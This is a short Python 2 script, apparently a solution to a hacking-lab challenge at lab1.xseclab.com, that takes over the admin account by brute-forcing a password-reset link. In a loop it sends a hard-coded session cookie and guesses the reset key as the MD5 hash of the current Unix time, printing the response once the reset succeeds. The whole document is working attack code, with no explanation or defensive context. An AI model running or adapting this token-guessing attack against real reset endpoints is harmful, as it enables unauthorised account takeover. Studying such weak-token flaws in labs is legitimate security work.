#coding:utf-8

import requests
import hashlib
import time

s = requests.Session()
header = {'Cookie': 'saeut=218.84.215.43.1453465933345761;PHPSESSID=bdaca74ae968e76278e26155496162d0'}
while True:
    pwd = hashlib.new('md5', str(int(time.time()))).hexdigest()
    url = 'http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=' + pwd + '&username=admin'
    r = s.get(url, headers=header)
    if r.content != '':
        print r.content
        break
    else:
        #print '[+]Breaking----------------------------------', pwd
        pass
